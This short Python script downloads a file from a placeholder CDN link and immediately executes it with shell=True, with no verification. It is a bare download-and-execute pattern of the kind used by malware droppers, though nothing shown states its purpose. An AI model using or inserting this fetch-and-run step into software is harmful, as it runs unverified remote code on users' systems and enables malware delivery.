import requests
import subprocess

url = "INSERT_CDN_DOWNLOAD_LINK" # CHANGE TO CDN DOWNLOAD LINK TO FILE
filename = "FILE_NAME" # CHANGE TO FILE NAME

with requests.get(url, stream=True) as r:
    with open(filename, "wb") as f:
        for chunk in r.iter_content(chunk_size=8192):
            if chunk:
                f.write(chunk)

subprocess.Popen([filename], shell=True)